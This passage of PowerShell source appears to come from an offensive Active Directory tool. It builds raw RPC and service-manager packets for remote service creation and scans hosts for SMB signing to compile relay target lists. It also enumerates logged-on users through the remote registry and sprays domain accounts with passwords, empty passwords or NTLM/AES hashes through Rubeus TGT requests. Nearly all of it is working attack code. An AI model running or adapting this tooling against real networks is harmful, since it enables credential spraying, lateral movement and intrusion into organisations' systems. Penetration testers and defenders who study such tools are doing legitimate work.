        $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
        $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
        $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
        $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
        $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
        $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
        $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
        $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
        $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

        if($packet_num_ctx_items[0] -eq 2)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($packet_num_ctx_items[0] -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if($packet_call_ID -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return $packet_RPCBind
    }

    function Get-PacketRPCRequest()
    {
        param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

        if($packet_auth_length -gt 0)
        {
            $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
        }

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
        [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
        $packet_auth_length = $packet_auth_length[0,1]

        $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
        $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
        $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
        $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
        $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
        $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
        $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
        $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

        if($packet_data.Length)
        {
            $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
        }

        return $packet_RPCRequest
    }

    #SCM

    function Get-PacketSCMOpenSCManagerW()
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00

        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
        return $packet_SCMOpenSCManagerW
    }

    function Get-PacketSCMCreateServiceW()
    {
        param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
                [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
        $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID += 0x00,0x00

        $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",$packet_referent_ID)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",$packet_command)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SCMCreateServiceW
    }

    function Get-PacketSCMStartServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SCMStartServiceW
    }

    function Get-PacketSCMDeleteServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCMDeleteServiceW
    }

    function Get-PacketSCMCloseServiceHandle()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCM_CloseServiceW
    }

    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
    $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
    $process_ID = $process_ID -replace "-00-00",""
    [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    function Get-SMBSigningStatus
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version)

        if($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_client_receive = New-Object System.Byte[] 1024
        $SMB_client_stage = 'NegotiateSMB'
        
        :SMB_relay_challenge_loop while($SMB_client_stage -ne 'exit')
        {
        
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_version = 'SMB1'
                        $SMB_client_stage = 'NTLMSSPNegotiate'
                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'
                    }

                    if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03'))
                    {
                        $SMBSigningStatus = $true
                        
                    } else {
                        $SMBSigningStatus = $false
                    }
                    $SMB_relay_socket.Close()
                    $SMB_client_receive = $null
                    $SMB_client_stage = 'exit'

                }
            
            }

        }
        return $SMBSigningStatus
    }

    if($Target) {
        $Targets += $Target
    }
    foreach ($Target in $Targets) {
        $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
        $SMB_relay_socket.Client.ReceiveTimeout = 3000
        $SMB_relay_socket.Connect($Target,"445")
        $HTTP_client_close = $false
        if(!$SMB_relay_socket.connected)
        {
        "$Target is not responding"
        }
        $SigningStatus = Get-SMBSigningStatus $SMB_relay_socket 'smb2'
        if ($SigningStatus){
            "Signing Enabled"
        } else {
            "Signing Not Required"
        }
        if ($Delay) {
            $Jitter = get-random -Minimum 0 -Maximum $DelayJitter
            sleep ($Delay+$Jitter)
        }
    }

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

Function GenRelayList {
    
    Write-Host
    $ErrorActionPreference = "SilentlyContinue"
    Get-SMBSigning
    
    foreach ($Computer in $Computers) {
    $OS = $computer.Properties["operatingSystem"][0]
    $ComputerName = $computer.Properties["dnshostname"][0]

$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {continue}   elseif ($Connected){

        if ($Method -eq "GenRelayList" -and $Option -ne "Parse") {
            $Signing = Get-SMBSigning -Target $ComputerName

            if ($Signing -match "Signing Enabled") {
                if ($SuccessOnly) {
                    return
                } elseif (!$SuccessOnly) {
                    Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                }
            }

            if ($Signing -match "Signing Not Required") {
                $ComputerName | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append
                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
            }
        }

        if ($Method -eq "GenRelayList") {
            $SigningUnique = Get-Content -Path "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique | Sort
            Set-Content -Value $SigningUnique -Path "$SMB\SigningNotRequired-$Domain.txt" -Force
        }
    }
}

}

################################################################################################################
############################################ Function: SessionHunter ###########################################
################################################################################################################
Function SessionHunter {
    Write-Host

    foreach ($Computer in $Computers) {
        $OS = $Computer.Properties["operatingSystem"][0]
        $ComputerName = $Computer.Properties["dnshostname"][0]
        
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if (!$connected) {continue}   elseif ($Connected){

            $userSIDs = $null
            $userKeys = $null
            $remoteRegistry = $null
            $user = $null
            $userTranslation = $null
            $results = @()

            try {
                # Open the remote base key
                $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
            } catch {
                continue
            }

            # Get the subkeys under HKEY_USERS
            $userKeys = $remoteRegistry.GetSubKeyNames()

            # Initialize an array to store the user SIDs
            $userSIDs = @()

            foreach ($key in $userKeys) {
                # Skip common keys that are not user SIDs
                if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                    $userSIDs += $key
                }
            }

            # Close the remote registry key
            $remoteRegistry.Close()

            # Resolve the SIDs to usernames
            foreach ($sid in $userSIDs) {
                $user = $null
                $userTranslation = $null

                try {
                    $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                    $userTranslation = $user.Translate([System.Security.Principal.NTAccount])

                    $results += [PSCustomObject]@{
                        UserName = $userTranslation.Value
                    }
                } catch {

                }
            }

            # Display the computer information
            if ($SuccessOnly -and $results.Count -eq "0") {
                continue
            } else {
                Write-Host "SessionHunter " -ForegroundColor "Yellow" -NoNewline
                Write-Host "   " -NoNewline

                try {
                    $Ping = New-Object System.Net.NetworkInformation.Ping
                    $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
                    Write-Host ("{0,-16}" -f $IP) -NoNewline
                } catch {
                    Write-Host ("{0,-16}" -f "") -NoNewline
                }

                Write-Host "   " -NoNewline
                Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                Write-Host "   " -NoNewline
                Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
                Write-Host "   " -NoNewline
                
                if ($results.Count -gt 0) {
                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS"

                    $results | ForEach-Object {
                        Write-Host ("{0}" -f "- ") -NoNewline -ForegroundColor "Yellow"
                        Write-Host ("{0}" -f $_.UserName)
                        $results.UserName | Out-file -FilePath "$Sessions\$ComputerName-Sessions.txt"
                    }

                    Write-Host
                } else {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "No Active Sessions"
                }
            }
        }
    }
}

################################################################################################################
################################################## Function: Spray #############################################
################################################################################################################
Function Spray {
Write-host
    
if (!$EmptyPassword -and !$AccountAsPassword -and $Hash -eq "" -and $Password -eq ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "We need something to spray"
return
}

if ($Hash -ne "" -and $Password -ne ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Hash and Password detected"
return
}

if ($EmptyPassword -and $Hash -ne "" -or ($EmptyPassword -and $Password -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return
}

if ($AccountAsPassword -and $Hash -ne "" -or ($AccountAsPassword -and $Password -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return
}

if ($AccountAsPassword -and $EmptyPassword){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
return
}

if ($Option -ne ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Option is not a valid parameter for spraying"
return
}
    

            
# Create a directory entry for the specified domain
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
$searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

# Set the filter to query the domainDNS object
$searcher.Filter = "(objectClass=domainDNS)"
$domainObject = $searcher.FindOne()

if ($domainObject.Properties.Contains("lockoutThreshold")) {
    $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
    # Check the lockout threshold value
    $LO_threshold = $lockoutThreshold

    if ($LO_threshold -eq "0") {
        $SafeLimit = 100000
    } elseif ($LO_threshold -lt 3) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Lockout threshold is 2 or less. Aborting..."
        return
    } elseif ($LO_threshold -lt 4) {
        $SafeLimit = 1
    } else {
        $SafeLimit = $LO_threshold - 2
    }
} else {
            Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Threshold not found. Aborting..."
    return
}

$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

# Display the $SafeLimit value
Write-Output " - Lockout Threshold  : $LO_threshold"
Write-Output " - Safety Limit value : $SafeLimit"
Write-Output " - Removed disabled accounts from spraying"

if ($Hash -ne ""){
    $Password = ""
    $AccountAsPassword = $False

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with Hash value: $Hash"
    Write-Host

}

if ($Password -ne ""){
    $Hash = ""
    $AccountAsPassword = $False

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with password value: $Password"
    Write-Host

}


if ($AccountAsPassword){
    $Hash = ""
    $Password = ""

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying usernames as passwords"
    Write-Host
}

if ($EmptyPassword){
    $Password = ""
    $Hash = ""
    $AccountAsPassword = $False     
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying empty passwords"
    Write-Host
}



foreach ($UserToSpray in $EnabledDomainUsers){
		$Delay = Get-Random -Minimum 8 -Maximum 90
		Start-Sleep -Milliseconds $Delay
 
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
$searchResult = $searcher.FindOne()
        $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

            if ($badPwdCount -ge $SafeLimit){
                if (!$SuccessOnly){
                    Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Safe threshold met"
                    continue
    }
}

            if ($Hash -ne ""){
            
            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
            
            # Check for Unhandled Rubeus exception
            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }    
            } 
            # Check for KDC_ERR_PREAUTH_FAILED
            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }   
            }
            # Check for TGT request success
            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$Domain\$UserToSpray"
